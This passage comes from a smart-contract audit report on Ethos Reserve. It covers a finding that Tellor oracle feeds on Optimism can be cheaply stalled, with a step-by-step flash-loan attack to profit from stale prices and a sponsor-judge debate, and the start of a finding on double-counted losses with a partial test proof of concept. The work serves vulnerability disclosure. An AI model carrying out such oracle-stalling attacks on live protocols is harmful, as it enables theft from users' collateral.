𝑑𝑖𝑠𝑝𝑢𝑡𝑒𝐹𝑒𝑒𝑖 × 2 𝑑𝑖𝑠𝑝𝑢𝑡𝑒𝑅𝑜𝑢𝑛𝑑𝑠𝑖𝑑,𝑡−1</code></p>\n<p>Where</p>\n<p>𝑑𝑖𝑠𝑝𝑢𝑡𝑒𝐹𝑒𝑒𝑖 is the initial dispute fee (<code>baseFee</code>)</p>\n<p>𝑑𝑖𝑠𝑝𝑢𝑡𝑒𝑅𝑜𝑢𝑛𝑑𝑠𝑖𝑑 is the number of disputes open for a specific ID</p>\n<p>In Ethereum, there is a block every 15 seconds so stalling the system for 8 minutes (32 blocks) will cost an attacker around <code>2^32 * 10 TRB</code>  = 687 Billons of dollars! … (10TRB = 160USD). Not bad at all.</p>\n<p>Tellor team has similar values in different docs around internet.</p>\n<p>​However, this is nice if we <strong>always assume that one data is sent every block (an ideal system)</strong>.</p>\n<p>And here is where the real nightmare comes. Current frequency for data in Tellor is very low, <strong>that you are reading data once an hour or less!!</strong>.</p>\n<p>Even worse for Optimism and Polygon <code>basedisputeFee</code> is only 1TRB . (vs 10 TRB in Ethereum)</p>\n<p>This design was thought considering that these chains are faster so if you data is sent every block then breaking the system would be prohibitively expensive. Again, security depends on the frequency of data.</p>\n<p>In our real word, Tellor is producing data in Optimism as low as in Ethereum so in the end it is 10 times cheaper to break.</p>\n<h3 id=\"cost-to-stale-ethusd-pair-in-optimism\" style=\"position:relative;\"><a href=\"#cost-to-stale-ethusd-pair-in-optimism\" aria-label=\"cost to stale ethusd pair in optimism permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cost to Stale ETH/USD pair in Optimism</h3>\n<p>Lets calculate the CoS ETH/USD pair for 4 hours.</p>\n<p>Watching this Tellor contracts we can get that baseFee is 1TRB</p>\n<p><a href=\"https://optimistic.etherscan.io/address/0x46038969d7dc0b17bc72137d07b4ede43859da45#readContract\">https://optimistic.etherscan.io/address/0x46038969d7dc0b17bc72137d07b4ede43859da45#readContract</a> ==> <code>getDataFee()</code> = 1TRB</p>\n<p>Now, read data in a four hour range using the function.</p>\n<p><code>getMultipleValuesBefore()</code></p>\n<p>Parameters passed</p>\n<p><code>queryId = 0x83a7f3d48786ac2667503a61e8c415438ed2922eb86a2906e4ee66d9a2ce4992</code> (ID for asking ETH/USD pair value)</p>\n<p><code>timestamp = 1678147200</code> (7 march 2023 at 0:00)</p>\n<p><code>_max age = 14400</code> (4 hours earlier = 14400 seconds)</p>\n<p><code>_maxCount = 1000</code> (doesn’t really matter)</p>\n<p>We get only 4 values with the following timestamps [1678135628,1678139237,1678142833,1678146437]</p>\n<p>The <em>CoS</em> Tellor ETH/USD pair for these four hours would have been</p>\n<p><code>1TRB + 2TRB + 4TRB + 8 TRB = 15TRB</code></p>\n<p><code>15TRB * 16USD = 240 USD</code></p>\n<p>This means that for a little 240 bucks you can Stale 4 hours the Oracle which is not acceptable at all as I will show you an attacking scenario.</p>\n<p>Ethereum has moved only 1%, not so critical this time, however volatille ERC20 used as a collateral can have much bigger changes.</p>\n<p>You can query more data with different timestamps</p>\n<p><strong>Attacking Scenario: Flash Loan to profit</strong></p>\n<p>Steps:</p>\n<ol>\n<li>Write a contract that checks if Chainlink is working</li>\n<li>Meanwhile a second script that tracks values for all your collateral assets</li>\n<li>When Chainlink is broken do</li>\n<li>Stall all your collateral data from Tellor using <code>dispute</code>.   (10 collateral for <code>$2500</code>)</li>\n<li>Suppose that you see an increase of 10% one of the colaterral  call it ABC and ETH not moving so much</li>\n<li>Ask for a Flash Loan ETH in Uniswap</li>\n<li>Mint LUSD for ETH at Ethos</li>\n<li>Redeem LUSD for collateral ABC.    You get a 10% discount because Oracle is staled 4 hours ago</li>\n<li>Exchange LUSD for ETHEREUM in Uniswap.</li>\n<li>Return ETH to the flash loan plus interest</li>\n<li>Enjoy!</li>\n</ol>\n<p>Note that this attack can be improved if you perform the loan on a falling collateral to mint more LUSD.</p>\n<p>The only level of protection you have is the fact that Chainlink is working, in Liquity it is more difficult because it should be an important change of ETH value in those 4 hours.</p>\n<h3 id=\"recommended\" style=\"position:relative;\"><a href=\"#recommended\" aria-label=\"recommended permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended</h3>\n<p>There are two solutions in my opinion</p>\n<p><strong>Solution 1:  Tellor tip mechanism</strong></p>\n<p>Tellor whitepaper:</p>\n<p><em>“Parties who wish to build reporter support for their query should follow best practices when selecting data for their query (publish data specification on github, promote/ educate in the community), but will also need to tip a higher amount to incentivize activity”</em></p>\n<p>​This means that in order to use data safely you need to pay to be sure that frequency is secure taking into account the impact of the volatility and the time to dispute.</p>\n<p>I didn’t mention earlier but the cost to dispute is exponential but capped by the staking amount of the reporter, so no real billons of dollars in fact.</p>\n<p>Here is the documentation how you can fund for a feed <a href=\"https://docs.tellor.io/tellor/getting-data/funding-a-feed\">https://docs.tellor.io/tellor/getting-data/funding-a-feed</a></p>\n<p><strong>Solution 2: Do not use Tellor</strong></p>\n<p>Unlike Liquity, you need to fund several feeds so I don’t know if this is cost effective but you have options to fund fees only when Chainlink is broken but you need to investigate on that.</p>\n<p>In any case you have a function to set the oracle that I am reporting as medium so no sure if you need to use two oracles.</p>\n<h3 id=\"references\" style=\"position:relative;\"><a href=\"#references\" aria-label=\"references permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>References</h3>\n<ol>\n<li>Tellor White Paper <a href=\"https://tellor.io/whitepaper/\">https://tellor.io/whitepaper/</a></li>\n<li>Liquity Tellor issue 2022 <a href=\"https://www.liquity.org/blog/tellor-issue-and-fix\">https://www.liquity.org/blog/tellor-issue-and-fix</a></li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/772\">c4-sponsor labeled</a></strong> sponsor disputed</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/772#issuecomment-1459942559\">Trust (judge) commented</a>:</strong></p>\n<blockquote>\n<p>This submission is interesting, but <em>may</em> be invalid. The cost of stalling calculation assumes that attacker would only need to stall 4 price updates in 4 hours, however once stalling starts it would make sense for new price reports to appear very quickly, as soon as the next block. In other words, the sample warden has looked at only contains 4 updates because they were all legit.</p>\n<p>I have not verified this reasoning, but ask for sponsor to take a look and give their thoughts.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/772#issuecomment-1466290128\">tess3rac7 (Ethos Reserve) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>It relies on <strong>ALL</strong> of the following to be true:</p>\n<ul>\n<li>chainlink broken</li>\n<li>tellor stalled for > 4 hours somehow by a malicious attacker</li>\n<li>no other tellor reporter realizing/recognizing this</li>\n<li>sharp movement in one collateral price during that timeframe</li>\n<li>not much movement in another collateral price during that timeframe</li>\n</ul>\n<p>Probability of all of the above happening together almost negligible. Moreover, it seems the report doesn’t take into account:</p>\n<ul>\n<li>Redemption fee, which could be a very large % if the attacker is looking to drain the system</li>\n</ul>\n<p>Also forwarded this to our contacts at Tellor and this was their take:</p>\n<blockquote>\n<p>So for the first one, it’s fair.  A lot of times people have trouble waiting the 20 minutes and there always is a risk that the price will change drastically in those 20 minutes, but unfortunately it’s just something that happens when you deal with decentralized systems (e.g. exchanges wait several blocks for confirmation, Maker waits an hour before updating its oracle).  And not to mention, the price can move very drastically even in the 12 second block time of Ethereum, so if the goal is to never have a stale price, it’s literally impossible.  You just need to design a system that can slow down and won’t break if this happens (which Liquity did and I’m presuming you guys did something similar)</p>\n</blockquote>\n<blockquote>\n<p>For the second “bug”, the main flaw comes in the presumption of no outside actors looking to save the system or benefit from the attack.  When a good value is disputed on tellor, this is actually a profitable opportunity for any reporter.  Assuming the voting mechanism is not broken (as in the analysis), anyone who simply submits a good value will (after 4 rounds), double their TRB in 2 days.  (the voting period). This means that for 4 hours, you would need all of the reporters to not realize this.  This is a similar assumption as saying you could throw a uniswap pool and expect no one to see an arbitrage opportunity.  The second false assumption is that the current optimism report rate is how often the ETH/USD feed will update forever.  This is just wrong.  There are few reports on Optimism because there are no tips on Optimism and no one has even told any reporters (or the team) that they are live and would like more reports.  For relatively cheap, you can easily have several reports an hour, and even more if you’d like to pay for it.  Honestly however, you should probably just keep it on a 4 hour pace or a something that looks at the price change so as you aren’t over-paying or updating a same value.</p>\n</blockquote>\n<blockquote>\n<p>Additionally, there are measures that you as a team could take to  dissuade an attacker.  For one, you could move the 4 hour stale period longer (no reason 4 hours is a golden number).  Second, you can stake reporters and report yourself.  If you have a large number of stakes ready to report on Optimism, you could simply listen for disputes and act as a reporter of last resort while you alert the other reporters to come and join the fun.  Simply having this amount publicly known or ready would probably be enough to raise the costs to a high enough to prevent any attack.</p>\n</blockquote>\n<p>Based on all of the above, I’m leaning towards “not an issue.”</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/772#issuecomment-1468102917\">peritoflores (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Hi Team, sorry for that but it is either I am so wrong or you could be drained.<br>\nFirst, I have explained @Trust that reporters cannot just send reports every block after being disputed. This depends of how much they have staked.<br>\n<img src=\"https://user-images.githubusercontent.com/89490285/224994796-8b65ae2e-4c2b-4274-921d-9a02d6300ceb.png\" alt=\"image\"></p>\n<p>Secondly, there are only two reporters to protect the real system with a total staked valued at 5kUSD</p>\n<p><a href=\"https://optimistic.etherscan.io/address/0xD9157453E2668B2fc45b7A803D3FEF3642430cC0\">TELLOR ORACLE AT OPTIMISM</a></p>\n<p><img src=\"https://user-images.githubusercontent.com/89490285/224999714-3c76b081-03bd-46ac-a507-fe50381f642b.png\" alt=\"image\"></p>\n<p><strong>Tellor reporters are</strong><br>\n0x50a86759d495ecfa7c301071d6b0bdd4bd664ab0 ---> 200 trb locked<br>\n0xaac7da260fb6d047314e213f672b7d3d9503a1f7 ---> 130 trb locked<br></p>\n<p>Unless people are watching off-chain to bridge TRB to optimism, dispute, stake and then submit a new value it is possible to take the oracle with only 5k or less.<br>\nAfter disputing is not mandatory to submit a value.</p>\n<p><strong>About Tellor answer</strong><br>\nI agree with almost all they said. The dispute is profitable even to double your money, but I am just interested in stale the system. The question is that if it is possible to get a correct value on time.<br>\nWhat they explained about tips, of course I agree, in fact it is the solution that I proposed. </p>\n<p><strong>About your words</strong><br>\n<code>chainlink broken</code><br><br>\n--->   This is the only condition </p>\n<p><code>tellor stalled for > 4 hours somehow by a malicious attacker ---></code><br>\nThis is just an example can be more or even less time.</p>\n<p><code>no other tellor reporter realizing/recognizing this --></code><br></p>\n<p>As I explained there are only 2 reporters in the live system to protect you</p>\n<p><code>sharp movement in one collateral price during that timeframe</code><br>\n<code>not much movement in another collateral price during that timeframe</code></p>\n<p>That happened last weekend when USDC was falling down</p>\n<p>On March 11 From 1:00 AM to 5AM USDC lost almost 15% of its value.<br>\nHowever other crypto where not moving.</p>\n<p>Note that uniswap fees are only 0,3% plus gas cost.</p>\n<p><strong>An improved flash loan attack to drain collateral</strong></p>\n<p>Note that this attack is devastator because it is like an incredibly profitable arbitrage that can be performed in every block.</p>\n<p>While in arbitrage oportunities prices got balanced after the swap.</p>\n<p>Here the attacker can still hold the oracle and repeat the attack.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/772#issuecomment-1475967662\">Trust (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<ol>\n<li>Ethos relies on Tellor and plenty of logic faciliates the use of both CL/Tellor oracles, so the assumption of Chainlink downtime is definitely in-scope for medium severity.</li>\n<li>Having heard both sides, it seems the required attack indeed does not require <em>unreasonble</em> amount of effort by an attacker (esp. regarding two live reporters). </li>\n<li>Given the execution of the attack is possible, likelihood of it generating big profits at protocol’s expense is high.</li>\n</ol>\n<p>For these reasons, medium severity is most appropriate here.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/772#issuecomment-1476503552\">tess3rac7 (Ethos Reserve) commented</a>:</strong></p>\n<blockquote>\n<p>I’m still unclear as to how we can overlook redemption fees and claim that this will be profitable for an attacker looking to drain collateral.</p>\n<p>Redemption fees scales with:</p>\n<ul>\n<li>frequency of redemption, please see <a href=\"https://www.liquity.org/blog/on-price-stability-of-liquity\">https://www.liquity.org/blog/on-price-stability-of-liquity</a></li>\n<li>amount being redeemed (proportional to the debt size of the market), please see <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/TroveManager.sol#L1411\">https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/TroveManager.sol#L1411</a></li>\n</ul>\n<p>If the attacker decides to redeem in one large TX, the fee will be very high, not nearly enough to offset the hypothetical 10% gain in the warden’s example. Here are some discord messages of Liquity’s dev explaining:<br>\n<img src=\"https://user-images.githubusercontent.com/95557476/226397690-99cdc145-036b-4f51-84af-e45f7c082021.png\" alt=\"Screenshot from 2023-03-20 11-55-09\"></p>\n<p>If the attacker decides to redeem in smaller successive TXs, the base rate would keep increasing as explained in the blog post linked above.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-_harvestcore-roi-calculation-error\" style=\"position:relative;\"><a href=\"#m-02-_harvestcore-roi-calculation-error\" aria-label=\"m 02 _harvestcore roi calculation error permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/752\">[M-02] <code>_harvestCore()</code> roi calculation error</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/752\">bin2chen</a>, also found by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/710\">rbserver</a></em></p>\n<p>_harvestCore() roi calculation error,may double</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The _harvestCore() will calculate the roi and repayment values.<br>\nThe implementation code is as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_harvestCore</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_debt</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">roi</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">repayment</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_claimRewards</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numSteps</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">steps</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numSteps</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uncheckedInc</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">] </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">step</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">steps</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">IERC20Upgradeable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">startToken</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20Upgradeable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">step</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">startToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">continue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_swapVelo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">step</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">], </span><span class=\"mtk12\">step</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">], </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">VELO_ROUTER</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allocated</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">strategies</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">allocated</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalAssets</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">toFree</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_debt</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalAssets</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">allocated</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">profit</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">totalAssets</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">allocated</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">toFree</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">profit</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">roi</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">profit</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalAssets</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">allocated</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">roi</span><span class=\"mtk1\"> = -</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">allocated</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">totalAssets</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountFreed</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">loss</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_liquidatePosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">toFree</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">repayment</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">MathUpgradeable</span><span class=\"mtk1\">.</span><span class=\"mtk11\">min</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_debt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountFreed</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">roi</span><span class=\"mtk1\"> -= </span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">loss</span><span class=\"mtk1\">);</span><span class=\"mtk3\">//&lt;------这个地方可能会导致重复</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The last line may cause double counting of losses<br>\nFor example, the current:<br>\n<code>vault.allocated = 9</code><br>\n<code>vault.strategy.allocBPS = 9000</code><br>\n<code>strategy.totalAssets = 9</code></p>\n<p>Suppose that after some time, strategy loses 2, then:<br>\n<code>strategy.totalAssets = 9 - 2 = 7</code><br>\nAlso the administrator sets <code>vault.strategy.allocBPS = 0</code></p>\n<p>This executes harvest()->_harvestCore(9) to get<br>\n<code>roi = 4</code><br>\n<code>repayment = 7</code></p>\n<p>The actual loss of 2, but roi = 4 (double), test code as follows:</p>\n<p>add to test/starter-test.js ‘Vault Tests’</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">it</span><span class=\"mtk1\">.</span><span class=\"mtk11\">only</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;test_roi&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">, </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">wantHolder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">strategist</span><span class=\"mtk1\">} = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">loadFixture</span><span class=\"mtk1\">(</span><span class=\"mtk12\">deployVaultAndStrategyAndGetSigners</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">toWantUnit</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;10&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wantHolder</span><span class=\"mtk1\">)[</span><span class=\"mtk8\">&#39;deposit(uint256)&#39;</span><span class=\"mtk1\">](</span><span class=\"mtk12\">depositAmount</span><span 